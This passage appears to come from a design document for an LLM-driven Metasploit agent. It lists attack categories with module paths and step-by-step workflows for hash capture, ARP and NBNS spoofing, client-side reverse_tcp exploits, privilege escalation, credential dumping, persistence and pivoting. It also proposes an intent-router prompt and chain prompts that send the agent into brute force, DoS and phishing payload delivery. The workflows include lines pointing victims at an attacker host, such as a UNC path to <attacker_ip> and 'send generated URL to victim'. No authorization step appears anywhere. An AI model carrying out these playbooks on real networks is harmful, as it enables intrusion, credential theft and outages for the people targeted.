| 5 | **SMB Fuzzer** | Fuzz SMB negotiation | `auxiliary/fuzzers/smb/smb_negotiate_corrupt` |
| 6 | **DNS Fuzzer** | Fuzz DNS queries/responses | `auxiliary/fuzzers/dns/dns_fuzzer` |
| 7 | **SMTP Fuzzer** | Fuzz SMTP commands | `auxiliary/fuzzers/smtp/smtp_fuzzer` |
| 8 | **TLS/SSL Fuzzer** | Fuzz TLS handshake | `auxiliary/fuzzers/tls/tls_record_fuzzer` |

---

## Category 6: Credential Capture / MITM

**Description**: Passive or active credential harvesting via fake services or network interception.

**Entry Detection Keywords**: `capture`, `harvest`, `intercept`, `sniff`, `mitm`, `relay`, `ntlm`, `hash`, `responder`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CREDENTIAL CAPTURE CHAIN                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  === Step 1: Set up capture server ===                          │
│                                                                  │
│  1a. SMB Hash Capture:                                           │
│      use auxiliary/server/capture/smb                           │
│      set SRVHOST 0.0.0.0                                         │
│      set JOHNPWFILE /tmp/smb_hashes                             │
│      run -j                                                      │
│                                                                  │
│  1b. HTTP NTLM Capture:                                          │
│      use auxiliary/server/capture/http_ntlm                     │
│      set SRVHOST 0.0.0.0                                         │
│      set SRVPORT 8080                                            │
│      set JOHNPWFILE /tmp/http_hashes                            │
│      run -j                                                      │
│                                                                  │
│  === Step 2: Force authentication (optional) ===                │
│                                                                  │
│  2a. NBNS Spoofing (to redirect queries):                       │
│      use auxiliary/spoof/nbns/nbns_response                     │
│      set SPOOFIP <attacker_ip>                                   │
│      set REGEX .*                                                │
│      run -j                                                      │
│                                                                  │
│  2b. Or embed UNC path in document/email:                       │
│      \\<attacker_ip>\share\file.txt                             │
│                                                                  │
│  === Step 3: Crack captured hashes ===                          │
│                                                                  │
│  john --wordlist=/path/to/wordlist /tmp/smb_hashes              │
│  hashcat -m 5600 /tmp/smb_hashes /path/to/wordlist              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 6.1 Credential Capture Servers

| # | Protocol | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 1 | **SMB Hash Capture** | Captures NTLMv1/v2 hashes | `auxiliary/server/capture/smb` |
| 2 | **HTTP NTLM Capture** | Captures HTTP NTLM authentication | `auxiliary/server/capture/http_ntlm` |
| 3 | **HTTP Basic Capture** | Captures HTTP Basic auth credentials | `auxiliary/server/capture/http_basic` |
| 4 | **FTP Credential Capture** | Captures FTP credentials | `auxiliary/server/capture/ftp` |
| 5 | **IMAP Capture** | Captures IMAP credentials | `auxiliary/server/capture/imap` |
| 6 | **POP3 Capture** | Captures POP3 credentials | `auxiliary/server/capture/pop3` |
| 7 | **SMTP Capture** | Captures SMTP credentials | `auxiliary/server/capture/smtp` |
| 8 | **MySQL Capture** | Captures MySQL credentials | `auxiliary/server/capture/mysql` |
| 9 | **PostgreSQL Capture** | Captures PostgreSQL credentials | `auxiliary/server/capture/postgresql` |
| 10 | **VNC Capture** | Captures VNC authentication | `auxiliary/server/capture/vnc` |

### 6.2 Active Directory Credential Attacks

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 11 | **Pass-the-Hash (PtH)** | Reuses NTLM hashes for authentication | `exploit/windows/smb/psexec` |
| 12 | **Pass-the-Ticket (PtT)** | Reuses Kerberos tickets | Mimikatz post module |
| 13 | **Kerberoasting** | Extracts service account password hashes | `auxiliary/gather/kerberos_enumusers` |
| 14 | **AS-REP Roasting** | Attacks accounts without pre-auth | `auxiliary/gather/asrep_roast` |
| 15 | **DCSync Attack** | Replicates domain credentials | `post/windows/gather/credentials/domain_hashdump` |
| 16 | **Mimikatz Integration** | Dumps credentials from memory | `post/windows/gather/credentials/credential_collector` |
| 17 | **LLMNR/NBT-NS Poisoning** | Captures hashes via name resolution | `auxiliary/spoof/llmnr/llmnr_response` |
| 18 | **mDNS Poisoning** | Multicast DNS poisoning | `auxiliary/spoof/mdns/mdns_response` |
| 19 | **WPAD Spoofing** | Web Proxy Auto-Discovery spoofing | `auxiliary/server/wpad` |
| 20 | **NTLM Relay Attacks** | Relays authentication to other services | `exploit/windows/smb/smb_relay` |

### 6.3 Network Sniffing

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 21 | **Psnuffle (Password Sniffer)** | Sniffs passwords from network traffic | `auxiliary/sniffer/psnuffle` |

---

## Category 7: Wireless / Network Attacks

**Description**: Attacks targeting wireless networks and network infrastructure.

**Entry Detection Keywords**: `wireless`, `wifi`, `arp`, `spoof`, `poison`, `mitm`, `network`, `rogue`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              ARP POISONING CHAIN                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/spoof/arp/arp_poisoning                       │
│  2. set INTERFACE eth0                                           │
│  3. set DHOSTS <target_ip>        (victim)                      │
│  4. set SHOSTS <gateway_ip>       (router)                      │
│  5. set BIDIRECTIONAL true                                       │
│  6. run -j                                                       │
│                                                                  │
│  Then combine with credential capture or traffic analysis       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 7.1 Network Spoofing Attacks

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **ARP Poisoning** | Man-in-the-middle via ARP cache poisoning | `auxiliary/spoof/arp/arp_poisoning` |
| 2 | **NBNS Response Spoofing** | NetBIOS name resolution spoofing | `auxiliary/spoof/nbns/nbns_response` |
| 3 | **LLMNR Response Spoofing** | Link-Local Multicast Name Resolution spoofing | `auxiliary/spoof/llmnr/llmnr_response` |
| 4 | **mDNS Spoofing** | Multicast DNS spoofing | `auxiliary/spoof/mdns/mdns_response` |
| 5 | **DNS Spoofing** | DNS response spoofing | `auxiliary/spoof/dns/dns_spoof` |
| 6 | **DHCP Spoofing** | Rogue DHCP server | `auxiliary/server/dhcp` |

### 7.2 SNMP Exploitation

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 7 | **SNMP Community String Scan** | Discovers SNMP community strings | `auxiliary/scanner/snmp/snmp_login` |
| 8 | **SNMP Enumeration** | Enumerates system info via SNMP | `auxiliary/scanner/snmp/snmp_enum` |
| 9 | **SNMP Set Exploitation** | Exploits writable SNMP OIDs | `auxiliary/scanner/snmp/snmp_set` |

### 7.3 Rogue Services

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 10 | **Rogue DHCP Server** | Issues malicious DHCP leases | `auxiliary/server/dhcp` |
| 11 | **Rogue DNS Server** | Responds to DNS queries with malicious IPs | `auxiliary/server/fakedns` |
| 12 | **Rogue HTTP Proxy** | Intercepts HTTP traffic | `auxiliary/server/http_proxy` |

---

## Category 8: Web Application Attacks

**Description**: Attacks specifically targeting web applications (beyond CVE-based exploits).

**Entry Detection Keywords**: `web`, `http`, `sql injection`, `xss`, `sqli`, `directory`, `traversal`, `lfi`, `rfi`, `upload`

### 8.1 Web Application Exploits

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **SQL Injection (SQLi)** | Extracts data or executes commands via database queries | `auxiliary/sqli/*` |
| 2 | **Local File Inclusion (LFI)** | Reads arbitrary files from the server | `exploit/unix/webapp/*_lfi` |
| 3 | **Remote File Inclusion (RFI)** | Includes and executes remote malicious scripts | `exploit/unix/webapp/*_rfi` |
| 4 | **XML External Entity (XXE)** | Exploits XML parsers to read files or perform SSRF | `exploit/multi/http/*_xxe*` |
| 5 | **Server-Side Request Forgery (SSRF)** | Forces server to make requests to internal resources | Various webapp modules |
| 6 | **File Upload RCE** | Uploads malicious files (webshells) to gain execution | `exploit/multi/http/*_upload` |
| 7 | **WebDAV Exploitation** | Exploits misconfigured WebDAV to upload and execute code | `exploit/windows/iis/iis_webdav_upload_asp` |
| 8 | **PHP CGI Argument Injection** | Passes malicious arguments to PHP | `exploit/multi/http/php_cgi_arg_injection` |
| 9 | **Tomcat Manager Upload** | Uses default/weak credentials to deploy malicious WAR | `exploit/multi/http/tomcat_mgr_upload` |
| 10 | **JBoss JMX Console RCE** | Deploys malicious applications via JMX | `exploit/multi/http/jboss_*` |

### 8.2 Web Scanning and Enumeration

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 11 | **Directory Enumeration** | Brute forces directories and files | `auxiliary/scanner/http/dir_scanner` |
| 12 | **File Enumeration** | Discovers hidden files | `auxiliary/scanner/http/files_dir` |
| 13 | **Web App Version Detection** | Identifies CMS and framework versions | `auxiliary/scanner/http/http_version` |
| 14 | **HTTP Method Enumeration** | Tests allowed HTTP methods | `auxiliary/scanner/http/options` |
| 15 | **Virtual Host Enumeration** | Discovers virtual hosts | `auxiliary/scanner/http/vhost_scanner` |
| 16 | **Robots.txt Scanner** | Parses robots.txt for hidden paths | `auxiliary/scanner/http/robots_txt` |
| 17 | **Backup File Scanner** | Finds backup files (.bak, .old, etc.) | `auxiliary/scanner/http/backup_file` |
| 18 | **HTTP Header Checker** | Analyzes security headers | `auxiliary/scanner/http/http_header` |

### 8.3 CMS-Specific Scanners

| # | CMS | Description | Metasploit Module |
|---|-----|-------------|-------------------|
| 19 | **WordPress Scanner** | WordPress vulnerability scanning | `auxiliary/scanner/http/wordpress_*` |
| 20 | **Joomla Scanner** | Joomla vulnerability scanning | `auxiliary/scanner/http/joomla_*` |
| 21 | **Drupal Scanner** | Drupal vulnerability scanning | `auxiliary/scanner/http/drupal_*` |

---

## Category 9: Client-Side Exploitation

**Description**: Attacks requiring victim interaction (browser, document, media).

**Entry Detection Keywords**: `browser`, `client`, `java`, `flash`, `pdf`, `office`, `document`, `malicious file`, `drive-by`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CLIENT-SIDE EXPLOIT CHAIN                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search type:exploit platform:windows target:browser         │
│     or: use exploit/windows/browser/ie_*                        │
│     or: use exploit/multi/browser/java_*                        │
│                                                                  │
│  2. show options                                                 │
│                                                                  │
│  3. set SRVHOST <attacker>                                       │
│  4. set SRVPORT <port>                                           │
│  5. set PAYLOAD windows/meterpreter/reverse_tcp                 │
│  6. set LHOST <attacker>                                         │
│  7. set LPORT <callback_port>                                    │
│                                                                  │
│  8. exploit -j                                                   │
│                                                                  │
│  Output: URL to send to victim                                  │
│  Wait for victim to visit URL in vulnerable browser             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 9.1 Browser Exploits

| # | Browser/Plugin | Description | Metasploit Module |
|---|----------------|-------------|-------------------|
| 1 | **Internet Explorer** | Multiple IE memory corruption exploits | `exploit/windows/browser/ie_*` |
| 2 | **Firefox** | Firefox vulnerabilities | `exploit/multi/browser/firefox_*` |
| 3 | **Chrome** | Chrome vulnerabilities | `exploit/multi/browser/chrome_*` |
| 4 | **Java Applet** | Java browser plugin exploits | `exploit/multi/browser/java_*` |
| 5 | **Adobe Flash** | Flash Player exploits | `exploit/multi/browser/adobe_flash_*` |
| 6 | **Silverlight** | Microsoft Silverlight exploits | `exploit/windows/browser/silverlight_*` |
| 7 | **WebKit** | WebKit engine exploits | `exploit/multi/browser/webkit_*` |

### 9.2 Document-Based Exploits

| # | Document Type | Description | Metasploit Module |
|---|---------------|-------------|-------------------|
| 8 | **PDF (Adobe Reader)** | Adobe Reader exploits | `exploit/windows/fileformat/adobe_*` |
| 9 | **Word Document** | Microsoft Word exploits | `exploit/windows/fileformat/ms*_word_*` |
| 10 | **Excel Document** | Microsoft Excel exploits | `exploit/windows/fileformat/ms*_excel_*` |
| 11 | **PowerPoint** | Microsoft PowerPoint exploits | `exploit/windows/fileformat/ms*_powerpoint_*` |
| 12 | **RTF Document** | RTF format exploits | `exploit/windows/fileformat/office_word_hta` |
| 13 | **HTA File** | HTML Application exploits | `exploit/windows/misc/hta_server` |

### 9.3 Media File Exploits

| # | Media Type | Description | Metasploit Module |
|---|------------|-------------|-------------------|
| 14 | **ImageMagick** | Image processing library exploits | `exploit/unix/fileformat/imagemagick_delegate` |
| 15 | **FFmpeg** | Video processing exploits | Various |
| 16 | **VLC** | VLC media player exploits | `exploit/windows/fileformat/vlc_*` |

### 9.4 Browser Autopwn

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 17 | **Browser Autopwn** | Automatic browser exploit selection | `auxiliary/server/browser_autopwn2` |

---

## Category 10: Local Privilege Escalation

**Description**: Attacks executed AFTER initial access to escalate privileges.

**Entry Detection Keywords**: `privilege`, `escalate`, `root`, `system`, `sudo`, `local`, `kernel`, `privesc`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              LOCAL PRIVESC CHAIN                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Prerequisites: Already have a Meterpreter/shell session        │
│                                                                  │
│  === Option A: Built-in getsystem (Windows) ===                 │
│  meterpreter > getsystem                                         │
│                                                                  │
│  === Option B: Local exploit module ===                         │
│  1. background                    (background current session)  │
│  2. search type:exploit platform:linux local                    │
│  3. use exploit/linux/local/dirty_pipe                          │
│  4. set SESSION <session_id>                                     │
│  5. set LHOST <attacker>                                         │
│  6. set LPORT <new_port>                                         │
│  7. exploit                                                      │
│                                                                  │
│  === Option C: Post module suggestion ===                       │
│  1. run post/multi/recon/local_exploit_suggester                │
│  2. Review suggested exploits                                    │
│  3. Run appropriate local exploit                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 10.1 Linux Privilege Escalation

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 1 | **Dirty Pipe** | Linux kernel pipe buffer overflow | CVE-2022-0847 | `exploit/linux/local/cve_2022_0847_dirtypipe` |
| 2 | **Dirty COW** | Linux kernel copy-on-write race | CVE-2016-5195 | `exploit/linux/local/dirtycow` |
| 3 | **Baron Samedit (Sudo)** | Sudo heap overflow | CVE-2021-3156 | `exploit/linux/local/sudo_baron_samedit` |
| 4 | **PwnKit (Polkit)** | Polkit pkexec privilege escalation | CVE-2021-4034 | `exploit/linux/local/cve_2021_4034_pwnkit` |
| 5 | **Overlayfs** | Overlayfs privilege escalation | CVE-2021-3493 | `exploit/linux/local/overlayfs_priv_esc` |
| 6 | **Netfilter** | Netfilter local privilege escalation | CVE-2022-25636 | `exploit/linux/local/netfilter_priv_esc_ipv4` |
| 7 | **SUID Binary Exploit** | Abuses misconfigured SUID binaries | N/A | `post/linux/gather/enum_protections` |
| 8 | **Cron Job Exploitation** | Exploits writable cron jobs | N/A | Manual or `post/linux/gather/enum_cron` |

### 10.2 Windows Privilege Escalation

| # | Attack Type | Description | CVE/MS | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 9 | **Juicy Potato** | Token impersonation via BITS | MS16-075 | `exploit/windows/local/ms16_075_reflection_juicy` |
| 10 | **Rotten Potato** | Token impersonation via NTLM relay | N/A | `exploit/windows/local/rotten_potato` |
| 11 | **Sweet Potato** | Token impersonation variant | N/A | `exploit/windows/local/sweet_potato` |
| 12 | **Hot Potato** | NBNS/WPAD relay to SYSTEM | N/A | `exploit/windows/local/hot_potato` |
| 13 | **Print Nightmare** | Print Spooler privilege escalation | CVE-2021-34527 | `exploit/windows/local/cve_2021_34527_printnightmare` |
| 14 | **UAC Bypass (fodhelper)** | Bypasses UAC via fodhelper | N/A | `exploit/windows/local/bypassuac_fodhelper` |
| 15 | **UAC Bypass (eventvwr)** | Bypasses UAC via eventvwr | N/A | `exploit/windows/local/bypassuac_eventvwr` |
| 16 | **Service Permissions** | Exploits weak service permissions | N/A | `exploit/windows/local/service_permissions` |
| 17 | **Unquoted Service Path** | Exploits unquoted service paths | N/A | `exploit/windows/local/unquoted_service_path` |
| 18 | **DLL Hijacking** | Plants malicious DLLs | N/A | `exploit/windows/local/dll_*` |
| 19 | **Always Install Elevated** | Exploits MSI installation policy | N/A | `exploit/windows/local/always_install_elevated` |
| 20 | **Getsystem** | Built-in privilege escalation techniques | N/A | `meterpreter > getsystem` |

### 10.3 Post-Exploitation Modules

| # | Category | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 21 | **Local Exploit Suggester** | Suggests applicable local exploits | `post/multi/recon/local_exploit_suggester` |
| 22 | **Credential Dump (Windows)** | Dumps Windows credentials | `post/windows/gather/credentials/credential_collector` |
| 23 | **Hashdump** | Dumps SAM database hashes | `post/windows/gather/hashdump` |
| 24 | **Mimikatz** | Advanced credential extraction | `post/windows/gather/credentials/mimikatz` |
| 25 | **SSH Key Collection** | Collects SSH keys from Linux | `post/linux/gather/ssh_creds` |
| 26 | **Process Migration** | Moves to higher-privileged process | `post/windows/manage/migrate` |

### 10.4 Persistence Mechanisms

| # | Platform | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 27 | **Windows Registry** | Registry-based persistence | `post/windows/manage/persistence_exe` |
| 28 | **Windows Service** | Service-based persistence | `exploit/windows/local/persistence_service` |
| 29 | **Windows Scheduled Task** | Task scheduler persistence | `post/windows/manage/scheduled_task` |
| 30 | **Linux Cron** | Cron job persistence | `post/linux/manage/cron_persistence` |
| 31 | **Linux SSH Key** | SSH authorized_keys persistence | `post/linux/manage/sshkey_persistence` |

### 10.5 Pivoting and Lateral Movement

| # | Technique | Description | Metasploit Module/Command |
|---|-----------|-------------|---------------------------|
| 32 | **Port Forwarding** | Forward local port to remote | `meterpreter > portfwd add` |
| 33 | **Route Add** | Add route through session | `msf > route add <subnet> <session>` |
| 34 | **SOCKS Proxy** | Create SOCKS proxy for tunneling | `auxiliary/server/socks_proxy` |
| 35 | **Autoroute** | Automatic routing through sessions | `post/multi/manage/autoroute` |

---

## Agent Routing Architecture

### Proposed Graph Structure

```
                              ┌───────────────────┐
                              │   USER REQUEST    │
                              └─────────┬─────────┘
                                        │
                                        ▼
                              ┌───────────────────┐
                              │   INTENT ROUTER   │
                              │   (New LLM Node)  │
                              └─────────┬─────────┘
                                        │
           ┌────────────────────────────┼────────────────────────────┐
           │            │               │               │            │
           ▼            ▼               ▼               ▼            ▼
    ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
    │ CVE-BASED│ │BRUTE FORCE│ │ SOCIAL   │ │   DoS    │ │ CAPTURE  │
    │  CHAIN   │ │  CHAIN   │ │  CHAIN   │ │  CHAIN   │ │  CHAIN   │
    └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘
         │            │             │            │            │
         ▼            ▼             ▼            ▼            ▼
    ┌──────────────────────────────────────────────────────────────┐
    │                     EXPLOITATION PHASE                        │
    │                 (Chain-specific workflows)                    │
    └──────────────────────────────────────────────────────────────┘
                                        │
                    ┌───────────────────┼───────────────────┐
                    │                   │                   │
                    ▼                   ▼                   ▼
             ┌──────────┐       ┌──────────┐        ┌──────────┐
             │ SESSION  │       │ CREDS    │        │   NONE   │
             │ ACQUIRED │       │ CAPTURED │        │(DoS/Fuzz)│
             └────┬─────┘       └────┬─────┘        └────┬─────┘
                  │                  │                   │
                  ▼                  ▼                   ▼
    ┌───────────────────┐ ┌───────────────────┐ ┌───────────────────┐
    │ POST-EXPLOITATION │ │  CHAIN TO OTHER   │ │    COMPLETE       │
    │     (Statefull)   │ │  ATTACK PATH      │ │    (Report)       │
    └───────────────────┘ └───────────────────┘ └───────────────────┘
```

### Intent Router Implementation

The Intent Router is a new LLM-powered node that determines which attack chain to follow.

```python
# Proposed addition to prompts.py

INTENT_ROUTER_PROMPT = """Analyze the user request and determine the attack path category.

## User Request
{user_request}

## Available Target Information
{target_info}

## Attack Path Categories

| Category | Keywords | Entry Module Pattern |
|----------|----------|---------------------|
| cve_exploit | CVE-, MS17-, exploit, vulnerability, pwn, hack | exploit/* |
| brute_force | brute, password, credential, login, crack, spray | auxiliary/scanner/*/login |
| social_engineering | phish, social, email, campaign, usb, malicious | auxiliary/server/* or exploit/multi/handler |
| dos_attack | dos, denial, crash, disrupt, flood | auxiliary/dos/* |
| fuzzing | fuzz, crash, discover, overflow, bug | auxiliary/fuzzers/* |
| credential_capture | capture, harvest, intercept, sniff, ntlm, hash | auxiliary/server/capture/* |
| wireless_attack | wireless, wifi, arp, spoof, poison, mitm | auxiliary/spoof/* |
| web_attack | web, http, sql injection, directory, lfi, rfi | auxiliary/scanner/http/* |
| client_side | browser, client, java, pdf, document, drive-by | exploit/*/browser/* |
| local_privesc | privilege, escalate, root, system, local | exploit/*/local/* or post/* |

## Output Format

```json
{
    "detected_category": "<category_name>",
    "confidence": <0.0-1.0>,
    "reasoning": "<why this category>",
    "entry_command": "<first metasploit command>",
    "requires_post_exploitation": <true/false>,
    "required_user_input": ["<list of info needed from user>"]
}
```
"""
```

### Chain-Specific Workflow Prompts

Each attack category needs its own workflow guidance in the system prompt:

```python
# Proposed chain-specific guidance

CHAIN_WORKFLOWS = {
    "cve_exploit": EXPLOITATION_TOOLS,  # Current implementation

    "brute_force": """
## Brute Force Attack Workflow

1. `use auxiliary/scanner/<protocol>/<protocol>_login`
2. `show options`
3. `set RHOSTS <target>`
4. `set USER_FILE /path/to/users.txt` OR `set USERNAME <user>`
5. `set PASS_FILE /path/to/passwords.txt` OR `set PASSWORD <pass>`
6. `set BRUTEFORCE_SPEED 3`
7. `set STOP_ON_SUCCESS true`
8. `run`

**Note**: Use `run` NOT `exploit`. No payload selection needed.
""",

    "social_engineering": """
## Social Engineering Workflow

### Option A: Payload + Handler
1. Generate payload (msfvenom)
2. `use exploit/multi/handler`
3. `set PAYLOAD <matching_payload>`
4. `set LHOST/LPORT`
5. `exploit -j` (background job)
6. Deliver payload to victim

### Option B: Web Delivery
1. `use exploit/multi/script/web_delivery`
2. `set TARGET <type>`
3. `set PAYLOAD <payload>`
4. `set LHOST/LPORT`
5. `exploit -j`
6. Send generated URL to victim
""",

    "dos_attack": """
## DoS Attack Workflow

1. `use auxiliary/dos/<protocol>/<module>`
2. `show options`
3. `set RHOSTS <target>`
4. `set RPORT <port>`
5. `run`

**Note**: DoS does NOT provide post-exploitation. Mark complete after run.
""",

    "credential_capture": """
## Credential Capture Workflow

1. `use auxiliary/server/capture/<protocol>`
2. `set SRVHOST 0.0.0.0`
3. `set JOHNPWFILE /tmp/hashes`
4. `run -j` (background)
5. Optionally: Force auth via NBNS/LLMNR spoofing
6. Crack captured hashes offline
""",

    "local_privesc": """
## Local Privilege Escalation Workflow

Prerequisites: Active session required!

1. `run post/multi/recon/local_exploit_suggester`
2. Review suggested exploits
3. `use exploit/*/local/<suggested_module>`
4. `set SESSION <session_id>`
5. `set LHOST/LPORT` (for new session)
6. `exploit`
""",
}
```

---

## Post-Exploitation Considerations

### Post-Exploitation Decision Matrix

| Attack Category | Session Possible? | Post-Expl Type | Transition? |
|----------------|-------------------|----------------|-------------|
| CVE Exploit | Yes | Statefull/Stateless | Yes |
| Brute Force | Sometimes (SSH) | Statefull | Yes |
| Social Engineering | Yes (if payload runs) | Statefull | Yes |
| DoS | No | N/A | No |
| Fuzzing | No | N/A | No |
| Credential Capture | Indirect (chain) | N/A | No (chain) |
| Wireless | Sometimes | Statefull | Sometimes |
| Web Attack | Sometimes | Varies | Sometimes |
| Client-Side | Yes | Statefull | Yes |
| Local PrivEsc | Already in post | N/A | N/A |

### Chaining Attack Paths

Some attack paths naturally chain into others:

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK PATH CHAINING                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Credential Capture ──┬──► Brute Force (with captured users)    │
│                       └──► Pass-the-Hash (with NTLM hashes)     │
│                                                                  │
│  Brute Force (SSH) ──────► Post-Exploitation (shell session)    │
│                                                                  │
│  Web Attack ─────────┬──► CVE Exploit (if vuln discovered)      │
│                      └──► SQL Injection (data exfil)            │
│                                                                  │
│  Fuzzing ────────────────► CVE Research (if crash found)        │
│                                                                  │
│  Initial Access ─────────► Local PrivEsc ──► Persistence        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Implementation Roadmap

### Phase 1: Intent Router (Minimal)
- [ ] Add intent detection keywords to `_infer_required_phase()`
- [ ] Expand beyond just "exploitation keywords" to include brute force, DoS, etc.
- [ ] Route different intents to appropriate prompts

### Phase 2: Chain-Specific Workflows
- [ ] Create `BRUTE_FORCE_TOOLS` prompt (similar to `EXPLOITATION_TOOLS`)
- [ ] Create `DOS_TOOLS` prompt
- [ ] Create `CAPTURE_TOOLS` prompt
- [ ] Create `SOCIAL_ENGINEERING_TOOLS` prompt
- [ ] Update `get_phase_tools()` to select based on detected chain

### Phase 3: Dynamic Post-Exploitation Handling
- [ ] Add chain type to state (`attack_chain_type`)
- [ ] Modify post-exploitation transition logic based on chain type
- [ ] Handle chains that don't have post-exploitation (DoS, Fuzzing)

### Phase 4: Attack Path Chaining
- [ ] Detect when one attack path should chain to another
- [ ] Implement credential hand-off (capture → brute force)
- [ ] Implement vulnerability hand-off (fuzz → CVE exploit)

### Phase 5: Full Graph Routing
- [ ] Implement Intent Router as separate LangGraph node
- [ ] Create chain-specific sub-graphs
- [ ] Implement dynamic routing between chains

---

## Summary Statistics

| Category | Module Count | Example Count |
|----------|--------------|---------------|
| CVE-Based Exploitation | 2,300+ exploits | 55 examples |
| Brute Force / Credential | 30+ modules | 31 examples |
| Social Engineering | 15+ modules | 15 examples |
| DoS / Availability | 50+ modules | 15 examples |
| Fuzzing / Discovery | 20+ modules | 8 examples |
| Credential Capture / MITM | 25+ modules | 21 examples |
| Wireless / Network | 15+ modules | 12 examples |
| Web Application | 100+ modules | 21 examples |
| Client-Side Exploitation | 50+ modules | 17 examples |
| Local Privilege Escalation | 100+ modules | 35 examples |
| **TOTAL** | **~4,500+ modules** | **230+ examples** |

---

## References

- [Metasploit Framework Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Exploit Database](https://www.rapid7.com/db/)
- [Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)
- [Metasploit Auxiliary Modules Spreadsheet](https://www.infosecmatter.com/metasploit-auxiliary-modules-detailed-spreadsheet/)
- [Post-Exploitation Modules Reference](https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/)
- [Social Engineering with Metasploit](https://docs.rapid7.com/metasploit/social-engineering/)
- [Brute Force Attacks Documentation](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CVE Database](https://cve.mitre.org/)

---

*Document Version: 2.0*
*Last Updated: 2026-01-31*
*Author: RedAmon Development Team*
